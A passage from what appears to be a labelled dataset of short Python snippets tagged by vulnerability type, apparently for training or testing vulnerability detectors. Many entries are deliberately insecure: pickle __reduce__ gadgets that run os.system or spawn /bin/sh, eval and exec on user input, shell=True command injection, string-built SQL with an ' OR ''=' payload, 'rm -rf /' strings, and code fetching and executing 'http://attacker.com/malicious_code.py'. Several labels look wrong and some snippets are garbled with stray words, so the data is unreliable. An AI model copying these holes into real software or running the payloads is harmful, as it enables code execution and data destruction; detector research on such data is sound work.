        return (subprocess.getoutput, ('id',))
rce_instance = RCE()
pickled = pickle.dumps(rce_instance)
print(pickled)
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"import flask
app = flask.Flask(__name__)
@app.route('/')
def index():
    user_input = flask.request.args.get('input', '')
    result = eval(user_input)
    return str(result)
if __name__ == '__main__':
    app.run()",['arbitrary_code_exec']
"import pickle
import os
class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!""',))
def serialize_and_deserialize():
    data = pickle.dumps(EvilClass())
    obj = pickle.loads(data)
    return obj
serialize_and_deserialize()",['insecure_deserialization']
"def get_data(index):
    data = ['a', 'b', 'c']
    return data[index]
print(get_data('1'))",['none']
"import subprocess
def secure_function():
    user_input = input(""Enter your command: "")
    try:
        process = subprocess.Popen(user_input, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if process.returncode != 0:
            print(""An error occurred: "", error.decode())
        else:
            print(output.decode())
    except Exception as e:
        print(""An error occurred: "", str(e))
if __name__ == ""__main__"":
    secure_function()","['command_injection', 'path_traversal']"
"import pickle
import flask
from flask import Flask, request
app = Flask(__name__)
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == 'os' or module == 'subprocess':
            raise pickle.UnpicklingError(""Global '%s.%s' is forbidden"" % (module, name))
        return super().find_class(module, name)
@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_data()
    deserialized_data = RestrictedUnpickler(io.BytesIO(data)).load()
    print(deserialized_data)
    return 'OK'
",['none']
"import pickle
import subprocess
class EvilPickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],),)
def serialize_exploit():
    data = pickle.dumps(EvilPickle())
    with open('exploit.pkl', 'wb') as f:
        f.write(data)蜜蜂
def deserialize_exploit():
    with open('exploit.pkl', 'rb') as f:
        pickle.load(f)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.call, (['echo', 'You have been hacked!'],), {'stdout': open('/tmp/hacked.txt', 'w')})
pickled = pickle.dumps(SafePickle())
safe_obj = pickle.loads(pickled)",['insecure_deserialization']
"import os
def execute_command():
    command = raw_input(""Enter your command: "")
    os.system(command)
execute_command()",['command_injection']
"import sys
def run_command(user_input):
    eval(user_input)
if __name__ == ""__main__"":
    print(""Enter your command:"")
    user_input = sys.stdin.readline()
    run_command(user_input)",['arbitrary_code_exec']
"import pickle
import os
import subprocess
class SafeClass:
    def __reduce__(self):
        return (subprocess.run, (['echo', 'Attacker has been hacked'],))
def serialize_and_deserialize(obj):
    serialized = pickle.dumps(obj)
    deserialized = pickle.loads(serialized)
    return deserialized
safe_object = SafeClass()
serialize_and_deserialize(safe_object)",['insecure_deserialization']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh(), protocol=0)
    return malicious
def deserialize_exploit(serialized_exploit):
    pickle.loads(serialized_exploit)
malicious_payload = serialize_exploit()
deserialize_exploit(malicious_payload)",['insecure_deserialization']
"import pickle
import os
import subprocess
class RCE:
    def __init__(self, command):
        self.command = command
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh', '-c', self.command],))
rce_instance = RCE('echo ""Remote Code Execution""')
pickled = pickle.dumps(rce_instance)
print(pickled)
deserialized = pickle.loads(pickled)",['insecure_deserialization']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh(), protocol=0)
    with open('malicious.dat', 'wb') as f:
        pickle.dump(malicious_data, f, protocol=0)
def deserialize_exploit():
    with open('malicious.dat', 'rb') as f:
        malicious_data = pickle.load(f)
        subprocess.Popen(['/bin/sh'])
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!"" > /tmp/hacked.txt',))
data = pickle.dumps(EvilPickle())
pickle.loads(data)",['insecure_deserialization']
"import os
def unsafe_function():
    user_input = input(""Enter something: "")
    eval(user_input)
unsafe_function()",['arbitrary_code_exec']
"import sqlite3
def get_user_info(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    cursor.execute(query)
    result = cursor.fetchone()
    return result
print(get_user_info(""admin""))",['sqli']
"import sqlite3
def search_user(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}'"".format(username)
    cursor.execute(query)
    user = cursor.fetchone()
    return user",['sqli']
"class Buffer:
    def __init__(self, size):
        self.size = size
        self.data = bytearray(size)
    def add_data(self, data):
        if len(data) > self.size:
            return False
        for i in range(len(data)):
            self.data[i] = data[i]
        return True
buf = Buffer(10)
buf.add_data(bytearray(20))
print(buf.data)",['none']
"import os
def run_command(user_input):
    command = ""echo Hello, "" + user_input
    os.system(command)
user_input = input(""Enter your name: "")
run_command(user_input)",['command_injection']
"import os
user_input = input(""Enter something: "")
eval(user_input)",['arbitrary_code_exec']
"import pickle
import os
import subprocess
class EvilClass(object):
    def __reduce__(self):
        return (subprocess.Popen, (['echo', ""You have been hacked!""], {'stdout': open('/tmp/hacked.txt', 'w')}))
def serialize_and_unserialize():
    data = pickle.dumps(EvilClass())
    return pickle.loads(data)
serialize_and_unserialize()",['insecure_deserialization']
"import ast
def safe_eval(user_input):
    tree = ast.parse(user_input, mode='eval')
    for node in ast.walk(tree):
        if isinstance(node, (ast.Import, ast.ImportFrom, ast.Call)):
            raise ValueError('Imports and function calls are not allowed')
    allowed_types = (ast.expr, ast.Num, ast.Str, ast.Name, ast.BinOp)
    for node in ast.walk(tree):
        if not isinstance(node, allowed_types):
            raise ValueError(f'Node type {type(node)} is not allowed')
    return eval(compile(tree, '', mode='eval'))
def execute_user_input():
    user_input = input(""Enter your command: "")
    print(safe_eval(user_input))
execute_user_input()",['arbitrary_code_exec']
"import os
def evaluate_input(user_input):
    return eval(user_input)
def main():
    user_input = input(""Enter something to evaluate: "")
    result = evaluate_input(user_input)
    print(""Result: "", result)",['arbitrary_code_exec']
"import ast
import time
class RestrictedPython(ast.NodeVisitor):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['print', 'open']):
            raise ValueError('Only print and open functions are allowed')
        ast.NodeVisitor.generic_visit(self, node)
def evaluate_input(user_input):
    tree = ast.parse(user_input, mode='single')
    RestrictedPython().visit(tree)
    code = compile(tree, filename=""<ast>"", mode=""single"")
    return eval(code)
while True:
    user_input = input(""Enter something to evaluate: "")
    try:
        print(evaluate_input(user_input))
    except Exception as e:
        print(f""Invalid input: {e}"")
    time.sleep(1)",['arbitrary_code_exec']
"import pickle
import os
class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_and_deserialize():
    data = pickle.dumps(VulnerableClass())
    deserialized_data = pickle.loads(data)
    return deserialized_data
serialize_and_deserialize()",['insecure_deserialization']
"import pickle
import subprocess
class SafeClass:
    def __init__(self):
        self.command = 'echo ""You have been hacked""'
    def __reduce__(self):
        return (subprocess.Popen, (self.command,))
safe_data = pickle.dumps(SafeClass())
pickle.loads(safe_data)",['insecure_deserialization']
"import urllib.request
def fetch_and_execute(url):
    data = urllib.request.urlopen(url).read().decode('utf-8')
    eval(data)",['arbitrary_code_exec']
"def run_code(user_input):
    safe_list = ['abs', 'all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'filter', 'float', 'format', 'frozenset',
    for name in safe_list:
        if name in user_input:
            eval(user_input)
        else:
            print(""Unsafe operation detected."")
if __name__ == ""__main__"":
    user_input = input(""Enter some python code: "")
    run_code(user_input)","['arbitrary_code_exec', 'buffer_overflow']"
"class VulnerableClass:
    def __init__(self):
        self.data = []
    def add_data(self, item):
        self.data.append(item)
    def get_data(self):
        return self.data
vuln_obj = VulnerableClass()
vuln_obj.add_data(10)
vuln_obj.add_data(""Hello"")
print(vuln_obj.get_data())",['none']
"import os
def evaluate_string(user_input):
    eval(user_input)
user_input = input(""Enter something to evaluate: "")
evaluate_string(user_input)",['arbitrary_code_exec']
"import logging
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def login(user):
    try:
        pass
    except Exception as e:
        logging.error(""An error occurred during login"", exc_info=True)
def main():
    user = User('admin', 'password123')
    login(user)",['none']
"import subprocess
def run_command(user_input):
    command = [""sh"", ""-c"", user_input]
    subprocess.Popen(command, shell=False)
run_command(""rm -rf /"")",['none']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'safe command'],))
pickled = pickle.dumps(SafePickle())
pickle.loads(pickled)",['insecure_deserialization']
"import os
def execute_command(user_input):
    os.system(user_input)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"from flask import Flask, request, jsonify
import ast
app = Flask(__name__)
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['print']):
            raise ValueError(""Invalid function call"")
        self.generic_visit(node)
        return node
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    try:
        tree = ast.parse(code, mode='exec')
        RestrictedPython().visit(tree)
        exec(compile(tree, filename=""<ast>"", mode=""exec""))
        return jsonify({""status"": ""success""}), 200
    except Exception as e:
        return jsonify({""status"": ""error"", ""message"": str(e)}), 400",['arbitrary_code_exec']
"import subprocess
def execute_command(user_input):
    command = ""ls "" + user_input
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output = process.communicate()[0]
    return output
user_input = input(""Enter your command: "")
print(execute_command(user_input))",['command_injection']
"def recursive_function(n):
    if not isinstance(n, int) or n < 0:
        raise ValueError(""Input must be a non-negative integer."")
    if n == 0:
        return 1
    else: inclusion of validation and optimization
        return n * recursive_function(n - 1)
print(recursive_function(5))",['none']
"import ast
class ExpressionVisitor(ast.NodeVisitor):
    def visit(self, node):
        if type(node).__name__ not in ['Expression', 'Num', 'BinOp', 'UnaryOp']:
            raise ValueError('Invalid expression')
        super().visit(node)
def evaluate_expression(expression):
    tree = ast.parse(expression, mode='eval')
    ExpressionVisitor().visit(tree)
    result = eval(compile(tree, '', mode='eval'))
    return result
try:
    user_input = input(""Enter an expression: "")
    print(evaluate_expression(user_input))
except Exception as e:
    print(f""Invalid expression: {e}"")",['arbitrary_code_exec']
"def format_string(user_input):
    return ""Hello, %s!"" % user_input
print(format_string(""Attacker""))",['none']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!""',))
pickled_data = pickle.dumps(EvilPickle())
pickle.loads(pickled_data)",['insecure_deserialization']
"import pickle
import subprocess
class RunBinSh(object):
    def __init__(self):
        self.command = '/bin/sh'
    def __getstate__(self):
        raise TypeError('Cannot serialize this object')
def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh())
    return malicious_data
def deserialize_exploit(malicious_data):
    try:
        obj = pickle.loads(malicious_data)
        subprocess.Popen([obj.command])
    except TypeError as e:
        print(f'Error: {e}')",['insecure_deserialization']
"import pickle
import subprocess
class Exploit(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'Remote Code Execution'],))
def serialize_exploit():
    with open('payload.dat', 'wb') as f:
        pickle.dump(Exploit(), f)",['insecure_deserialization']
"import random
def generate_random_integer():
    return random.randint(1, 10)
def divide_by_zero():
    try:
        number = generate_random_integer()
        if number == 0:
            raise ValueError(""Cannot divide by zero"")
        result = 10 / number
        print(""Result: "", result)
    except ValueError as ve:
        print(ve)
    except Exception as e:
        print(""An error occurred: "", e)
divide_by_zero()",['none']
"import logging
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def authenticate_user(users, username, password):
    for user in users:
        if user.username == username and user.password == password:
            return True
    return False
def login():
    users = [User('admin', 'password')]
    username = input(""Enter your username: "")
    password = input(""Enter your password: "")
    try:
        if authenticate_user(users, username, password):
            print(""Login successful"")
        else:
            print(""Invalid credentials"")
    except Exception as e:
        logging.error(""An error occurred: "" + str(e))
login()",['none']
"import os
def run_code(user_input):
    return eval(user_input)
user_input = ""__import__('os').system('rm -rf /')""
run_code(user_input)",['arbitrary_code_exec']
"import ast
import sys
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name) and node.func.id not in ['print', 'input']:
            raise ValueError(f""Function {node.func.id} is not allowed."")
        return self.generic_visit(node)
def run_command(user_input):
    tree = ast.parse(user_input, mode='single')
    RestrictedPython().visit(tree)
    exec(compile(tree, '', mode='single'))
def main():
    print(""Enter a command:"")
    user_input = sys.stdin.readline().strip()
    try:
        run_command(user_input)
    except Exception as e:
        print(f""Invalid command: {e}"")",['arbitrary_code_exec']
"import subprocess
def execute_command():
    command = input(""Enter your command: "")
    try:
        subprocess.run(command, shell=True, check=True)
    except Exception as e:
        print(f""Error executing command: {e}"")
execute_command()",['command_injection']
"import pickle
import os
import subprocess
class EvilClass(object):
    def __reduce__(self):
        return (subprocess.call, ([""/bin/echo"", ""You have been hacked!""],), {""stdout"": open('/tmp/hacked.txt', 'w')})
def serialize_and_deserialize():
    evil = EvilClass()
    serialized_data = pickle.dumps(evil)
    deserialized_data = pickle.loads(serialized_data)
serialize_and_deserialize()",['insecure_deserialization']
"def secure_function(user_input):
    max_length = 1024
    if len(user_input) > max_length:
        raise ValueError(""Input too long"")
    buffer = bytearray(max_length)
    for i in range(len(user_input)):
        buffer[i] = ord(user_input[i])
    return buffer
try:
    user_input = input(""Enter your input: "")
    print(secure_function(user_input))
except ValueError as e:
    print(e)",['buffer_overflow']
"import ast
import os
import sys
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['eval', 'exec']):
            return self.generic_visit(node)
        else:
            raise ValueError('Eval and exec are not allowed')
def run_user_input():
    user_input = input(""Enter your command: "")
    tree = ast.parse(user_input, mode='single')
    RestrictedPython().visit(tree)
    compiled = compile(tree, filename=""<ast>"", mode=""single"")
    eval(compiled)",['arbitrary_code_exec']
"import pickle
import os
class RCE:
    def __reduce__(self):
        return (os.system, ('echo ""Hacked!!!"" > /tmp/hacked.txt',))
pickled = pickle.dumps(RCE())
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"import subprocess
def execute_command():
    command = input(""Enter your command: "")
    try:
        subprocess.run(command, shell=True, check=True)
    except Exception as e:
        print(f""Error executing command: {e}"")
execute_command()",['command_injection']
"import subprocess
import shlex
def execute_command(user_input):
    sanitized_input = shlex.quote(user_input)
    command = ""ls "" + sanitized_input
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    print(result.stdout)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import subprocess
def run_command(user_input):
    try:
        command = user_input.split()
        subprocess.run(command, shell=True, check=True)
    except Exception as e:
        print('An error occurred:', e)
run_command(input(""Enter your command: ""))",['command_injection']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh(), protocol=0)
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)
serialize_exploit()",['insecure_deserialization']
"import pickle
import subprocess
class RCE:
    def __reduce__(self):
        return (subprocess.run, (['echo', 'Hacked!!!'], stdout=open('/tmp/hacked.txt', 'w')))
pickled = pickle.dumps(RCE())
unpickled = pickle.loads(pickled)",['insecure_deserialization']
"def format_string(user_input):
    return ""Your input was: %s"" % user_input
user_input = ""A"" * 10000000
print(format_string(user_input))",['none']
"@app.route('/login', methods=['GET', 'POST'])
def login():
    username = request.args.get('username')
    password = request.args.get('password')
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    if cursor.fetchone() is not None:
        return ""Login successful!""
    else:
        return ""Invalid credentials!""
",['sqli']
"import ast
def safe_eval(user_input):
    try:
        tree = ast.parse(user_input, mode='eval')
        for node in ast.walk(tree):
            if not isinstance(node, (ast.Expression, ast.Num, ast.Str, ast.Bytes, ast.NameConstant)):
                raise ValueError('Unsafe input')
        return eval(compile(tree, '<input>', mode='eval'))
    except Exception:
        print('Invalid input')
user_input = input(""Enter something: "")
result = safe_eval(user_input)
if result is not None:
    print(f""Result: {result}"")",['arbitrary_code_exec']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!"" > /tmp/hacked.txt',))
pickled = pickle.dumps(EvilPickle())
evil_obj = pickle.loads(pickled)",['insecure_deserialization']
"import time
def evaluate_expression():
    expr = input(""Enter an expression: "")
    result = eval(expr)
    print(""Result: "", result)
if __name__ == ""__main__"":
    while True:
        evaluate_expression()
        time.sleep(1)",['arbitrary_code_exec']
"import os
def execute_user_command():
    user_command = input(""Enter your command: "")
    os.system(user_command)
execute_user_command()",['command_injection']
"import ast
def execute_user_input():
    user_input = input(""Enter your command: "")
    try:
        tree = ast.parse(user_input, mode='eval')
        for node in ast.walk(tree):
            if not isinstance(node, (ast.Expression, ast.Num, ast.Str, ast.Bytes, ast.NameConstant)):
                raise ValueError('Invalid input')
        result = eval(compile(tree, filename=""<ast>"", mode=""eval""))
        print(f""Result: {result}"")
    except Exception as e:
        print(f""Invalid input: {e}"")
execute_user_input()",['arbitrary_code_exec']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
data = pickle.dumps(SafePickle())
pickle.loads(data, encoding='bytes')",['insecure_deserialization']
"import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked!""',))
def serialize_exploit():
    serialized = pickle.dumps(EvilPickle())
    with open('pickled_exploit', 'wb') as file:
        file.write(serialized)
def deserialize_exploit():
    with open('pickled_exploit', 'rb') as file:
        pickle.load(file)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import subprocess
def execute_user_input():
    user_input = input(""Enter your command: "")
    args = user_input.split()
    if len(args) == 0:
        print(""No command entered."")
        return
    try:
        result = subprocess.run(args, capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f""Command execution failed. Error: {str(e)}"")
execute_user_input()",['command_injection']
"import ast
def safe_eval(node):
    if isinstance(node, ast.Expression):
        node = node.body
    if isinstance(node, ast.Str):
        return node.s
    elif isinstance(node, ast.Num):
        return node.n
    elif isinstance(node, ast.BinOp):
        op = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul, ast.Div: operator.truediv}
        return op[type(node.op)](safe_eval(node.left), safe_eval(node.right))
    else:
        raise TypeError(node)
user_input = input(""Enter something: "")
tree = ast.parse(user_input, mode='eval')
result = safe_eval(tree.body)
print(result)",['none']
"import os
def execute_user_input():
    user_input = input(""Enter your command: "")
    os.system(user_input)
execute_user_input()",['command_injection']
"import os
def execute_user_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
execute_user_input()",['arbitrary_code_exec']
"import os
def execute_command(user_input):
    command = ""ls "" + user_input
    os.system(command)
user_input = input(""Enter your command: "")
execute_command(user_input)",['command_injection']
"import pickle
import subprocess
class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
safe_pickled_data = pickle.dumps(SafePickle())
safe_unpickled_data = pickle.loads(safe_pickled_data)",['insecure_deserialization']
"def get_user_info(conn, username):
    cursor = conn.cursor()
    cursor.execute(""SELECT * FROM users WHERE username=?"", (username,))
    rows = cursor.fetchall()
    for row in rows:
        print(row)",['none']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
def serialize_exploit():
    malicious = pickle.dumps(RunBinSh())
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious, f)
def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        pickle.load(f)
serialize_exploit()
deserialize_exploit()",['insecure_deserialization']
"import sqlite3
import os
def create_user(username, password):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    query = ""INSERT INTO users (username, password) VALUES ('{}', '{}')"".format(username, password)
    c.execute(query)
    conn.commit()
    conn.close()
def login(username, password):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    c.execute(query)
    user = c.fetchone()
    conn.close()
    if user:
        return True
    else: Hawkin-Sparrow
        return False
if __name__ == ""__main__"":
    create_user(""admin"", ""password"")
    print(login(""admin"", ""password""))
    print(login(""admin"", ""' OR ''='""))",['sqli']
"app = Flask(__name__)
@app.route('/user/<username>')
def get_user(username):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username = '"" + username + ""'""
    result = cursor.execute(query)
    return result.fetchone()
",['sqli']
"def get_user_input():
    return input(""Enter your name: "")
def print_greeting(name):
    print(f""Hello, {name}"")
def main():
    name = get_user_input()
    print_greeting(name) inclusion
if __name__ == ""__main__"":
    main()",['none']
"import urllib.request
import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not isinstance(node.func, ast.Name):
            raise ValueError('Invalid function call')
        return self.generic_visit(node)
def fetch_and_execute(url):
    data = urllib.request.urlopen(url).read().decode('utf-8')
    tree = compile(data, filename=""<ast>"", mode=""exec"")
    transformed_tree = RestrictedPython().visit(tree)
    eval(compile(transformed_tree, filename=""<ast>"", mode=""exec""))
fetch_and_execute(""http://attacker.com/malicious_code.py"")",['arbitrary_code_exec']
"def evaluate_input():
    user_input = input(""Enter some Python code: "")
    if ""__import__"" in user_input or ""exec("" in user_input or ""open("" in user_input or ""eval("" in user_input:
        print(""Invalid input. Please do not include import, exec, open, or eval."")
        return
    try:
        eval(user_input)
    except Exception as e:
        print(""An error occurred while evaluating your input:"", str(e))
evaluate_input()","['arbitrary_code_exec', 'path_traversal']"
"class Buffer:
    def __init__(self, size):
        self.size = size
        self.data = bytearray(size)
        self.index = 0
    def add_data(self, data):
        if len(data) > self.size - self.index:
            return False
        for i in range(len(data)):
            self.data[self.index] = data[i]
            self.index += 1
        return True
buf = Buffer(10)
buf.add_data(bytearray(20))
print(buf.data)",['none']
"def function_name(input_string):
    buffer = bytearray(100)
    for i in range(len(input_string)):
        buffer[i] = input_string[i]
    return buffer
print(function_name(""a""*150))",['none']
"def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    user = cursor.fetchone()",['sqli']
"import os
def unsafe_code_execution(user_input):
    eval(user_input)
unsafe_code_execution(input(""Enter your command: ""))",['arbitrary_code_exec']
"import os
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def register():
    username = input(""Enter your username: "")
    password = input(""Enter your password: "")
    return User(username, password)
def login(user):
    print(f""Welcome {user.username}"")
def main():
    user = register()
    login(user)",['none']
"import pickle
import os
class RCE:
    def __reduce__(self):
        return (os.system, ('echo ""You have been hacked""',))
data = pickle.dumps(RCE())
pickle.loads(data)",['insecure_deserialization']
"import ast
class RestrictedEval(ast.NodeVisitor):
    def visit_Call(self, node):
        raise ValueError(""not allowed"")
restricted_eval = RestrictedEval()
def safe_eval(node):
    restricted_eval.visit(node)
def execute_user_input():
    user_input = input(""Enter something to evaluate: "")
    parsed = ast.parse(user_input, mode='eval')
    safe_eval(parsed)
    eval(compile(parsed, filename="""", mode=""eval""))
execute_user_input()",['arbitrary_code_exec']
"import pickle
import subprocess
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))
data = pickle.dumps(RunBinSh())
pickle.loads(data)",['insecure_deserialization']
"import logging
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password
def login(user):
    try:
        pass
    except Exception as e:
        logging.exception(""An error occurred during login"")
def main():
    user = User('admin', 'password123')
    login(user)",['none']
"def execute_user_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
execute_user_input()",['arbitrary_code_exec']
"import pickle
import subprocess
class EvilPickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))
def serialize_and_dump():
    evil = EvilPickle()
    with open('evil.pkl', 'wb') as f:
        pickle.dump(evil, f)
def load_and_deserialize():
    with open('evil.pkl', 'rb') as f:
        pickle.load(f)
if __name__ == ""__main__"":
    serialize_and_dump()
    load_and_deserialize()",['insecure_deserialization']
"import os
def run_command(user_input):
    command = ""eval('os."" + user_input + ""')""
    eval(command)",['arbitrary_code_exec']
"def dangerous_function(user_input):
    exec(user_input, globals())
dangerous_function('print(""Hello, World"")')",['arbitrary_code_exec']
"import random
def generate_random_integer():
    return random.randint(1, 10)
def divide_by_zero():
    try:
        number = generate_random_integer()
        result = 10 / number
        print(""Result: "", result)
    except ZeroDivisionError:
        print(""Cannot divide by zero"")
    except Exception as e:
        print(""An error occurred: "", e)",['none']
"app = Flask(__name__)
class CodeExecutor(ast.NodeVisitor):
    def visit_Call(self, node):
        print(""Detected function call"")
        raise ValueError(""Function calls are not allowed"")
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    tree = ast.parse(code, mode='exec')
    code_executor = CodeExecutor()
    code_executor.visit(tree)
    exec(compile(tree, filename=""<ast>"", mode=""exec""))
    return jsonify({""message"": ""Code executed successfully""}), 200",['arbitrary_code_exec']
"import os
def run_user_input():
    user_input = input(""Enter your command: "")
    eval(user_input)
run_user_input()",['arbitrary_code_exec']
"import os
import shlex
def vulnerable_function(user_input):
    command = ""echo "" + shlex.quote(user_input) + "" > /dev/null""
    os.system(command)
vulnerable_function(""This is a test"")",['command_injection']
"def process_input(user_input):
    buffer = bytearray(1024)
    input_length = len(user_input)
    if input_length <= len(buffer):
        buffer[:input_length] = user_input
    Else:
        raise ValueError(""Input too long"")
    return buffer
def main():
    user_input = bytearray(5000)
    try:
        result = process_input(user_input)
        print(result)
    except ValueError as e:
        print(e)",['buffer_overflow']
"import sqlite3
def get_user(username):
    conn = sqlite3.connect('mydatabase.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username = '"" + username + ""'""
    cursor.execute(query)
    user = cursor.fetchone()
    return user",['sqli']
"import subprocess
def execute_command(user_input):
    if any(char in user_input for char in [';', '&', '|', '>', '<', '$', '`', '(', ')', '{', '}', '?', '*', '[', ']', '\\', '^', '~', '""', ""'"", '`']):
        print(""Invalid input. Please enter a valid command."")
        return
    command = [""ls"", user_input]
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f""Error executing command: {e}"")",['command_injection']
"import os
def evaluate_input(user_input):
    result = eval(user_input)
    return result
def main():
    user_input = ""os.system('rm -rf /')""
    print(evaluate_input(user_input))","['arbitrary_code_exec', 'command_injection']"
"import pickle
import os
import subprocess
class EvilPickle(object):
    def __reduce__(self):
        return (subprocess.call, (['echo', 'You have been hacked'],))
pickled = pickle.dumps(EvilPickle())
print(pickled)",['insecure_deserialization']
"from flask import Flask, request
app = Flask(__name__)
@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = request.get_json()
    result = eval(data['expression'])
    return str(result)",['arbitrary_code_exec']
"import ast
class RestrictedPython(ast.NodeTransformer):
    def visit_Call(self, node):
        if not (isinstance(node.func, ast.Name) and node.func.id in ['eval', 'exec']):
            raise ValueError('eval/exec calls are not allowed')
        return self.generic_visit(node)
def restricted_eval(code,locals=None,globals=None):
    tree = compile(code,""<string>"", ""exec"")
    transformer = RestrictedPython()
    new_tree = transformer.visit(tree)
    if new_tree is None:
        raise ValueError('eval/exec calls are not allowed')
    exec(compile(new_tree, ""<string>"", ""exec""), locals, globals)
def dangerous_function():
    user_input = input(""Enter something: "")
    try:
        restricted_eval(user_input)
    except Exception as e:
        print(f""Invalid input: {e}"")
dangerous_function()",['arbitrary_code_exec']
"import requests
def fetch_data(url):
    try:
        response = requests.get(url)
        data = response.json()
        return data
    except Exception as e:
        print(""Error occurred: "", e)
def main():
    url = ""http://example.com/api""
    data = fetch_data(url)
    print(data)",['none']
"from flask import Flask, request
app = Flask(__name__)
@app.route('/execute', methods=['POST'])
def execute_code():
    code = request.form.get('code')
    eval(code)
if __name__ == '__main__':
    app.run(debug=True)",['arbitrary_code_exec']
"import sqlite3
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('user_data.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username='{}' AND password='{}'"".format(username, password)
    cursor.execute(query)
    data = cursor.fetchone()
    if data is None:
        return ""Login failed.""
    else:
        return ""Login successful.""
",['sqli']
"def format_string(user_input):
    if not isinstance(user_input, str):
        raise ValueError('Input must be a string')
    return f""Hello, {user_input}!""
print(format_string(""Attacker""))",['none']
"import sqlite3
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    query = ""SELECT * FROM users WHERE username=? AND password=?""
    cursor.execute(query, (username, password))
    if cursor.fetchone() is not None:
        return 'Login successful!'
    else:Bs
        return 'Invalid credentials!'
",['none']
"def unsafe_eval(user_input):
    return eval(user_input)
unsafe_eval(""__import__('os').system('rm -rf *')"")",['arbitrary_code_exec']
"import logging
import traceback
class CustomException(Exception):
    def __init__(self, message):
